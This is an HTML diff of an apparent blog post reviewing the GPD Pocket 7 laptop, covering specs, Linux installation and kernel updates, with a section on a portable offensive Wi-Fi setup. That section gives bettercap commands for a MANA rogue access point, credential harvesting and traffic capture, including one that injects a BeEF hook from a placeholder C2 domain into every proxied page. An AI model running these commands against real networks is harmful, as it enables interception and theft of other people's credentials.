@@ -1,25 +1,39 @@
 <!DOCTYPE html>
 <html lang=en>
-<head><meta name="generator" content="Hexo 3.9.0">
+<head>
     <!-- so meta -->
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="It’s no secret I’ve been recently playing with the GPD Pocket 7, an ultra small laptop which can run GNU/Linux and has more than decent hardware. Tablets are cool and everything, but I’ve been a fan o">
-<meta name="keywords" content="bettercap,mitm,linux,wifi pentesting,gpd pocket 7,gpd,wireless,sigint,sdr,rogue ap,mana,pentest,red teaming,hardware,equipment">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="It’s no secret I’ve been recently playing with the GPD Pocket 7, an ultra small laptop which can run GNU&#x2F;Linux and has more than decent hardware. Tablets are cool and everything, but I’ve been a fan o">
 <meta property="og:type" content="article">
 <meta property="og:title" content="GPD Pocket 7: Impressions, GNU&#x2F;Linux Installation and Offensive Setup">
 <meta property="og:url" content="https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/index.html">
 <meta property="og:site_name" content="evilsocket">
-<meta property="og:description" content="It’s no secret I’ve been recently playing with the GPD Pocket 7, an ultra small laptop which can run GNU/Linux and has more than decent hardware. Tablets are cool and everything, but I’ve been a fan o">
-<meta property="og:locale" content="en">
+<meta property="og:description" content="It’s no secret I’ve been recently playing with the GPD Pocket 7, an ultra small laptop which can run GNU&#x2F;Linux and has more than decent hardware. Tablets are cool and everything, but I’ve been a fan o">
+<meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://pbs.twimg.com/media/DG4TXarXcAAsxSa.jpg">
 <meta property="og:image" content="https://pbs.twimg.com/media/DHI-InZXgAEmggO.jpg">
-<meta property="og:updated_time" content="2020-05-26T18:30:57.529Z">
+<meta property="article:published_time" content="2017-08-15T15:13:21.000Z">
+<meta property="article:modified_time" content="2020-05-26T18:30:57.529Z">
+<meta property="article:author" content="Simone Margaritelli">
+<meta property="article:tag" content="bettercap">
+<meta property="article:tag" content="mitm">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="wifi pentesting">
+<meta property="article:tag" content="gpd pocket 7">
+<meta property="article:tag" content="gpd">
+<meta property="article:tag" content="wireless">
+<meta property="article:tag" content="sigint">
+<meta property="article:tag" content="sdr">
+<meta property="article:tag" content="rogue ap">
+<meta property="article:tag" content="mana">
+<meta property="article:tag" content="pentest">
+<meta property="article:tag" content="red teaming">
+<meta property="article:tag" content="hardware">
+<meta property="article:tag" content="equipment">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="GPD Pocket 7: Impressions, GNU&#x2F;Linux Installation and Offensive Setup">
-<meta name="twitter:description" content="It’s no secret I’ve been recently playing with the GPD Pocket 7, an ultra small laptop which can run GNU/Linux and has more than decent hardware. Tablets are cool and everything, but I’ve been a fan o">
 <meta name="twitter:image" content="https://pbs.twimg.com/media/DG4TXarXcAAsxSa.jpg">
     
     
@@ -42,19 +56,24 @@
     <!-- title -->
     <title>GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup</title>
     <!-- styles -->
-    <link rel="stylesheet" href="/css/style.css">
+    
+<link rel="stylesheet" href="/css/style.css">
+
     <!-- persian styles -->
     
-      <link rel="stylesheet" href="/css/rtl.css">
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
     
     <!-- rss -->
     
     
-      <link rel="alternate" href="/atom.xml" title="evilsocket" type="application/atom+xml">
+      <link rel="alternate" href="/atom.xml" title="evilsocket" type="application/atom+xml" />
     
-</head>
+<meta name="generator" content="Hexo 5.2.0"></head>
 
-<body class="max-width mx-auto px3 ltr">    
+<body class="max-width mx-auto px3 ltr">
+    
       <div id="header-post">
   <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
   <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
@@ -89,22 +108,22 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&text=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&title=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&is_video=false&description=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&text=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&title=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&is_video=false&description=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
   <li><a class="icon" href="mailto:?subject=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup&body=Check out this article: https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&title=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&title=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&title=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&title=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&name=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup&description=&lt;p&gt;It’s no secret I’ve been recently playing with the &lt;a href=&quot;https://www.indiegogo.com/projects/gpd-pocket-7-0-umpc-laptop-ubuntu-or-win-10-os-laptop--2&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;GPD Pocket 7&lt;/a&gt;, an ultra small laptop which can run GNU/Linux and has more than decent hardware. Tablets are cool and everything, but I’ve been a fan of ultra portable Linux devices since the &lt;a href=&quot;https://www.google.com/search?&amp;amp;source=lnms&amp;amp;tbm=isch&amp;amp;q=open+zaurus+sl-c1000&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Sharp Zaurus&lt;/a&gt; series. Considering that a &lt;a href=&quot;https://twitter.com/evilsocket/status/896847606072127488&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;lot of people were interested&lt;/a&gt; I decided to write this post to share my impressions, installation procedure and configuration tips.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://pbs.twimg.com/media/DG4TXarXcAAsxSa.jpg&quot; alt=&quot;gpd&quot;&gt;&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&title=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&title=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&title=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&title=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&name=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup&description=&lt;p&gt;It’s no secret I’ve been recently playing with the &lt;a href=&#34;https://www.indiegogo.com/projects/gpd-pocket-7-0-umpc-laptop-ubuntu-or-win-10-os-laptop--2&#34;&gt;GPD Pocket 7&lt;/a&gt;, an ultra small laptop which can run GNU/Linux and has more than decent hardware. Tablets are cool and everything, but I’ve been a fan of ultra portable Linux devices since the &lt;a href=&#34;https://www.google.com/search?&amp;source=lnms&amp;tbm=isch&amp;q=open+zaurus+sl-c1000&#34;&gt;Sharp Zaurus&lt;/a&gt; series. Considering that a &lt;a href=&#34;https://twitter.com/evilsocket/status/896847606072127488&#34;&gt;lot of people were interested&lt;/a&gt; I decided to write this post to share my impressions, installation procedure and configuration tips.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pbs.twimg.com/media/DG4TXarXcAAsxSa.jpg&#34; alt=&#34;gpd&#34;&gt;&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Specs"><span class="toc-number">1.</span> <span class="toc-text">Specs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Installing-GNU-Linux"><span class="toc-number">2.</span> <span class="toc-text">Installing GNU/Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Updating-custom-Kernel-and-stuff"><span class="toc-number">3.</span> <span class="toc-text">Updating custom Kernel and stuff.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getting-Offensive"><span class="toc-number">4.</span> <span class="toc-text">Getting Offensive</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impressions-amp-Links"><span class="toc-number">5.</span> <span class="toc-text">Impressions &amp; Links</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Keyboard"><span class="toc-number">5.0.1.</span> <span class="toc-text">Keyboard</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Battery-Life"><span class="toc-number">5.0.2.</span> <span class="toc-text">Battery Life</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Display"><span class="toc-number">5.0.3.</span> <span class="toc-text">Display</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Mouse"><span class="toc-number">5.0.4.</span> <span class="toc-text">Mouse</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Price"><span class="toc-number">5.0.5.</span> <span class="toc-text">Price</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Speed-Usability"><span class="toc-number">5.0.6.</span> <span class="toc-text">Speed / Usability</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Connectivity"><span class="toc-number">5.0.7.</span> <span class="toc-text">Connectivity</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Links"><span class="toc-number">5.0.8.</span> <span class="toc-text">Links</span></a></li></ol></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Specs"><span class="toc-number">1.</span> <span class="toc-text">Specs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Installing-GNU-Linux"><span class="toc-number">2.</span> <span class="toc-text">Installing GNU&#x2F;Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Updating-custom-Kernel-and-stuff"><span class="toc-number">3.</span> <span class="toc-text">Updating custom Kernel and stuff.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getting-Offensive"><span class="toc-number">4.</span> <span class="toc-text">Getting Offensive</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impressions-amp-Links"><span class="toc-number">5.</span> <span class="toc-text">Impressions &amp; Links</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Keyboard"><span class="toc-number">5.0.1.</span> <span class="toc-text">Keyboard</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Battery-Life"><span class="toc-number">5.0.2.</span> <span class="toc-text">Battery Life</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Display"><span class="toc-number">5.0.3.</span> <span class="toc-text">Display</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Mouse"><span class="toc-number">5.0.4.</span> <span class="toc-text">Mouse</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Price"><span class="toc-number">5.0.5.</span> <span class="toc-text">Price</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Speed-Usability"><span class="toc-number">5.0.6.</span> <span class="toc-text">Speed &#x2F; Usability</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Connectivity"><span class="toc-number">5.0.7.</span> <span class="toc-text">Connectivity</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Links"><span class="toc-number">5.0.8.</span> <span class="toc-text">Links</span></a></li></ol></li></ol></li></ol>
     </div>
   </span>
 </div>
@@ -131,12 +150,12 @@
       
     <div class="article-tag">
         <i class="fas fa-tag"></i>
-        <a class="tag-link" href="/tags/bettercap/">bettercap</a>, <a class="tag-link" href="/tags/equipment/">equipment</a>, <a class="tag-link" href="/tags/gpd/">gpd</a>, <a class="tag-link" href="/tags/gpd-pocket-7/">gpd pocket 7</a>, <a class="tag-link" href="/tags/hardware/">hardware</a>, <a class="tag-link" href="/tags/linux/">linux</a>, <a class="tag-link" href="/tags/mana/">mana</a>, <a class="tag-link" href="/tags/mitm/">mitm</a>, <a class="tag-link" href="/tags/pentest/">pentest</a>, <a class="tag-link" href="/tags/red-teaming/">red teaming</a>, <a class="tag-link" href="/tags/rogue-ap/">rogue ap</a>, <a class="tag-link" href="/tags/sdr/">sdr</a>, <a class="tag-link" href="/tags/sigint/">sigint</a>, <a class="tag-link" href="/tags/wifi-pentesting/">wifi pentesting</a>, <a class="tag-link" href="/tags/wireless/">wireless</a>
+        <a class="tag-link-link" href="/tags/bettercap/" rel="tag">bettercap</a>, <a class="tag-link-link" href="/tags/equipment/" rel="tag">equipment</a>, <a class="tag-link-link" href="/tags/gpd/" rel="tag">gpd</a>, <a class="tag-link-link" href="/tags/gpd-pocket-7/" rel="tag">gpd pocket 7</a>, <a class="tag-link-link" href="/tags/hardware/" rel="tag">hardware</a>, <a class="tag-link-link" href="/tags/linux/" rel="tag">linux</a>, <a class="tag-link-link" href="/tags/mana/" rel="tag">mana</a>, <a class="tag-link-link" href="/tags/mitm/" rel="tag">mitm</a>, <a class="tag-link-link" href="/tags/pentest/" rel="tag">pentest</a>, <a class="tag-link-link" href="/tags/red-teaming/" rel="tag">red teaming</a>, <a class="tag-link-link" href="/tags/rogue-ap/" rel="tag">rogue ap</a>, <a class="tag-link-link" href="/tags/sdr/" rel="tag">sdr</a>, <a class="tag-link-link" href="/tags/sigint/" rel="tag">sigint</a>, <a class="tag-link-link" href="/tags/wifi-pentesting/" rel="tag">wifi pentesting</a>, <a class="tag-link-link" href="/tags/wireless/" rel="tag">wireless</a>
     </div>
 
 
     </div>
-    <a href="https://www.patreon.com/bePatron?u=6065463" data-patreon-widget-type="become-patron-button">Become a Patron!</a><script async src="https://c6.patreon.com/becomePatronButton.bundle.js"></script>
+    <a target="_blank" rel="noopener" href="https://www.patreon.com/bePatron?u=6065463" data-patreon-widget-type="become-patron-button">Become a Patron!</a><script async src="https://c6.patreon.com/becomePatronButton.bundle.js"></script>
     <br/>
     <div class="addthis_sharing_toolbox"></div>
   </header>
@@ -145,9 +164,10 @@
   
 
   <div class="content" itemprop="articleBody">
-    <p>It’s no secret I’ve been recently playing with the <a href="https://www.indiegogo.com/projects/gpd-pocket-7-0-umpc-laptop-ubuntu-or-win-10-os-laptop--2" target="_blank" rel="noopener">GPD Pocket 7</a>, an ultra small laptop which can run GNU/Linux and has more than decent hardware. Tablets are cool and everything, but I’ve been a fan of ultra portable Linux devices since the <a href="https://www.google.com/search?&amp;source=lnms&amp;tbm=isch&amp;q=open+zaurus+sl-c1000" target="_blank" rel="noopener">Sharp Zaurus</a> series. Considering that a <a href="https://twitter.com/evilsocket/status/896847606072127488" target="_blank" rel="noopener">lot of people were interested</a> I decided to write this post to share my impressions, installation procedure and configuration tips.</p>
+    <p>It’s no secret I’ve been recently playing with the <a target="_blank" rel="noopener" href="https://www.indiegogo.com/projects/gpd-pocket-7-0-umpc-laptop-ubuntu-or-win-10-os-laptop--2">GPD Pocket 7</a>, an ultra small laptop which can run GNU/Linux and has more than decent hardware. Tablets are cool and everything, but I’ve been a fan of ultra portable Linux devices since the <a target="_blank" rel="noopener" href="https://www.google.com/search?&source=lnms&tbm=isch&q=open+zaurus+sl-c1000">Sharp Zaurus</a> series. Considering that a <a target="_blank" rel="noopener" href="https://twitter.com/evilsocket/status/896847606072127488">lot of people were interested</a> I decided to write this post to share my impressions, installation procedure and configuration tips.</p>
 <p><img src="https://pbs.twimg.com/media/DG4TXarXcAAsxSa.jpg" alt="gpd"></p>
 <a id="more"></a>
+
 <h3 id="Specs"><a href="#Specs" class="headerlink" title="Specs"></a>Specs</h3><p>Let’s start with the hardware specs of this sweet little thing:</p>
 <ul>
 <li>7-inch full-HD (1920×1200) IPS touch display</li>
@@ -166,31 +186,31 @@
 <h3 id="Installing-GNU-Linux"><a href="#Installing-GNU-Linux" class="headerlink" title="Installing GNU/Linux"></a>Installing GNU/Linux</h3><p>Despite they should start shipping the Ubuntu 16.04 models in a few days (?), I decided to buy the Windows version, which means I had to install GNU/Linux from scratch and overcome/fix several hardware issues … since I’m a good guy, let me share with you the correct procedure :D</p>
 <ol>
 <li>Download your GNU/Linux distribution ISO ( in my case, it was Ubuntu 17.04 ).</li>
-<li>Clone <a href="https://github.com/cawilliamson/ansible-gpdpocket" target="_blank" rel="noopener">this repository</a> and run the <code>bootstrap-iso.sh</code> script against the ISO file.</li>
+<li>Clone <a target="_blank" rel="noopener" href="https://github.com/cawilliamson/ansible-gpdpocket">this repository</a> and run the <code>bootstrap-iso.sh</code> script against the ISO file.</li>
 <li>Write the resulting <code>~/bootstrap.iso</code> file to an USB drive using UNetBootin or whatever you like.</li>
 <li>Plug the USB drive to your GPD, turn it on and press the <code>DEL</code> button to enter BIOS and boot from it.</li>
 </ol>
 <p>This will start the usual GNU/Linux installation procedure.</p>
 <p><strong>NOTE:</strong> Data on USB Type-C still does not work, but efforts are being made about it, we only need to wait.</p>
 <h3 id="Updating-custom-Kernel-and-stuff"><a href="#Updating-custom-Kernel-and-stuff" class="headerlink" title="Updating custom Kernel and stuff."></a>Updating custom Kernel and stuff.</h3><p>After installation and the routine system update, you might want to periodically update the fixes and custom kernel from the repository, in order to do so you should run the <code>gpd-update</code> script as root, this will take 2-3 hours since the kernel is going to be compiled on the device itself.</p>
-<p>If you are running Ubuntu 17.04 as me and are experiencing <a href="https://github.com/cawilliamson/ansible-gpdpocket/issues/49" target="_blank" rel="noopener">this issue</a>, you might want to do the following instead:</p>
+<p>If you are running Ubuntu 17.04 as me and are experiencing <a target="_blank" rel="noopener" href="https://github.com/cawilliamson/ansible-gpdpocket/issues/49">this issue</a>, you might want to do the following instead:</p>
 <p><strong>Make sure apt is not locked and you have internet connectivity first.</strong></p>
 <pre><code>sudo rm -rf /usr/src/ansible-gpdpocket
 sudo git clone https://github.com/cawilliamson/ansible-gpdpocket.git /usr/src/ansible-gpdpocket
 cd /usr/src/ansible-gpdpocket
-sudo git reset --hard origin/master
-</code></pre><p>Before you continue, edit the <code>roles/boot/tasks/debian.yml</code> file and <strong>remove this block</strong> from it:</p>
+sudo git reset --hard origin/master</code></pre>
+<p>Before you continue, edit the <code>roles/boot/tasks/debian.yml</code> file and <strong>remove this block</strong> from it:</p>
 <pre><code>- name: install intel-microcode (iso creation = no)
   apt: name=intel-microcode
   when: chroot == false
   tags:
-  - boot
-</code></pre><p>( Don’t worry, you already have Intel microcode installed )</p>
+  - boot</code></pre>
+<p>( Don’t worry, you already have Intel microcode installed )</p>
 <p>And eventually start the update process itself:</p>
-<pre><code>sudo ANSIBLE_NOCOWS=1 ansible-playbook system.yml
-</code></pre><p>After the update is over, reboot and you’re ready to go :)</p>
+<pre><code>sudo ANSIBLE_NOCOWS=1 ansible-playbook system.yml</code></pre>
+<p>After the update is over, reboot and you’re ready to go :)</p>
 <h3 id="Getting-Offensive"><a href="#Getting-Offensive" class="headerlink" title="Getting Offensive"></a>Getting Offensive</h3><p>At this point, you have a quad core Intel cpu, GNU/Linux and an USB 3.0 port, I mean, imagination is the limit! </p>
-<p>Personally, I like to have an Anker Astro E7 powerbank connected to the USB Type-C and the hardware I need to the USB 3.0 port (maybe with some <a href="https://www.amazon.it/gp/product/B0192W3HX8/ref=oh_aui_detailpage_o00_s00?ie=UTF8&amp;psc=1" target="_blank" rel="noopener">USB 3 hub</a>, to have appropriate bandwidth, powered by the same powerbank), then I can attach pretty much whatever I want to it, including an Alfa antenna, an Ubertooth One (great also to have a 2.4Ghz portable spectrum analyzer!) or some SDR card (most of SDR applications will require the full bandwidth of the USB port, which means it’s unlikely you’ll be able to use something else at the same time).</p>
+<p>Personally, I like to have an Anker Astro E7 powerbank connected to the USB Type-C and the hardware I need to the USB 3.0 port (maybe with some <a target="_blank" rel="noopener" href="https://www.amazon.it/gp/product/B0192W3HX8/ref=oh_aui_detailpage_o00_s00?ie=UTF8&psc=1">USB 3 hub</a>, to have appropriate bandwidth, powered by the same powerbank), then I can attach pretty much whatever I want to it, including an Alfa antenna, an Ubertooth One (great also to have a 2.4Ghz portable spectrum analyzer!) or some SDR card (most of SDR applications will require the full bandwidth of the USB port, which means it’s unlikely you’ll be able to use something else at the same time).</p>
 <p>Here’s a very ugly PoC of what I mean, I’m still waiting for a decent USB hub to be delivered by Amazon:</p>
 <p><img src="https://pbs.twimg.com/media/DHI-InZXgAEmggO.jpg" alt="stuff"></p>
 <p>In its simplest form, my portable offensive configuration is:</p>
@@ -201,12 +221,12 @@ sudo git reset --hard origin/master
 <li>Sensepost MANA running in <code>simple-nat</code> mode.</li>
 <li>BetterCap for credentials harvesting, pcap capture and reporting.</li>
 </ul>
-<pre><code>sudo bettercap --no-spoofing --no-discovery -I YOUR_ALFA_INTERFACE -X
-</code></pre><p>Or, if you feel really evil, you can also have the HTTP proxy inject your BEEF hook to every page:</p>
-<pre><code>sudo bettercap ...same as before... --proxy-module injectjs --js-url http://your-beef-c2-domain/hook.js
-</code></pre><p>If you’ll make bettercap save everything to a pcap file, this file will contains the traffic of all the targets and it will potentially become very big, I suggest you to use the USB hub and attach an external drive as well. Then just make bettercap write to it with appropriate command line arguments for offline inspection and credentials harvesting.</p>
-<pre><code>sudo bettercap ...same... --sniffer-output /media/your/usbdrive/capture.pcap
-</code></pre><p>… GOODBYE WIFI PINEAPPLE! :D</p>
+<pre><code>sudo bettercap --no-spoofing --no-discovery -I YOUR_ALFA_INTERFACE -X</code></pre>
+<p>Or, if you feel really evil, you can also have the HTTP proxy inject your BEEF hook to every page:</p>
+<pre><code>sudo bettercap ...same as before... --proxy-module injectjs --js-url http://your-beef-c2-domain/hook.js</code></pre>
+<p>If you’ll make bettercap save everything to a pcap file, this file will contains the traffic of all the targets and it will potentially become very big, I suggest you to use the USB hub and attach an external drive as well. Then just make bettercap write to it with appropriate command line arguments for offline inspection and credentials harvesting.</p>
+<pre><code>sudo bettercap ...same... --sniffer-output /media/your/usbdrive/capture.pcap</code></pre>
+<p>… GOODBYE WIFI PINEAPPLE! :D</p>
 <h3 id="Impressions-amp-Links"><a href="#Impressions-amp-Links" class="headerlink" title="Impressions &amp; Links"></a>Impressions &amp; Links</h3><p>TL;DR: This device is <strong>awesome</strong>, expensive, but still, <strong>awesome</strong>.</p>
 <h5 id="Keyboard"><a href="#Keyboard" class="headerlink" title="Keyboard"></a>Keyboard</h5><p>Yes the layout is a very weird displaced QWERTY and yes the keys are small … you’ll get used to it unless you have very big hands.</p>
 <h5 id="Battery-Life"><a href="#Battery-Life" class="headerlink" title="Battery Life"></a>Battery Life</h5><p>I didn’t try the battery life as I always use the powerbank (the USB devices are draining power, that would kill the internal 7000mAh battery), but people said they achieved <strong>3 hours of intense gaming</strong> on Windows, normal use on GNU/Linux should last quite long.</p>
@@ -217,10 +237,10 @@ sudo git reset --hard origin/master
 <h5 id="Connectivity"><a href="#Connectivity" class="headerlink" title="Connectivity"></a>Connectivity</h5><p>Internal WiFi is super stable and has decent coverage, Bluetooth also works great.</p>
 <h5 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h5><p>Check …</p>
 <ul>
-<li>… <a href="https://reddit.com/r/GPDPocket/" target="_blank" rel="noopener">this</a> out to stay updated on mods and hacks …</li>
-<li>… <a href="https://github.com/cawilliamson/ansible-gpdpocket" target="_blank" rel="noopener">this</a> for custom kernel and fixes …</li>
-<li>… <a href="https://github.com/jwrdegoede/linux-sunxi" target="_blank" rel="noopener">this</a> for custom kernel developement …</li>
-<li>and <a href="https://indiegogo.com/projects/gpd-pocket-7-0-umpc-laptop-ubuntu-or-win-10-os-laptop--2" target="_blank" rel="noopener">this</a> for official updates.</li>
+<li>… <a target="_blank" rel="noopener" href="https://reddit.com/r/GPDPocket/">this</a> out to stay updated on mods and hacks …</li>
+<li>… <a target="_blank" rel="noopener" href="https://github.com/cawilliamson/ansible-gpdpocket">this</a> for custom kernel and fixes …</li>
+<li>… <a target="_blank" rel="noopener" href="https://github.com/jwrdegoede/linux-sunxi">this</a> for custom kernel developement …</li>
+<li>and <a target="_blank" rel="noopener" href="https://indiegogo.com/projects/gpd-pocket-7-0-umpc-laptop-ubuntu-or-win-10-os-laptop--2">this</a> for official updates.</li>
 </ul>
 
   </div>
@@ -250,22 +270,22 @@ sudo git reset --hard origin/master
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Specs"><span class="toc-number">1.</span> <span class="toc-text">Specs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Installing-GNU-Linux"><span class="toc-number">2.</span> <span class="toc-text">Installing GNU/Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Updating-custom-Kernel-and-stuff"><span class="toc-number">3.</span> <span class="toc-text">Updating custom Kernel and stuff.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getting-Offensive"><span class="toc-number">4.</span> <span class="toc-text">Getting Offensive</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impressions-amp-Links"><span class="toc-number">5.</span> <span class="toc-text">Impressions &amp; Links</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Keyboard"><span class="toc-number">5.0.1.</span> <span class="toc-text">Keyboard</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Battery-Life"><span class="toc-number">5.0.2.</span> <span class="toc-text">Battery Life</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Display"><span class="toc-number">5.0.3.</span> <span class="toc-text">Display</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Mouse"><span 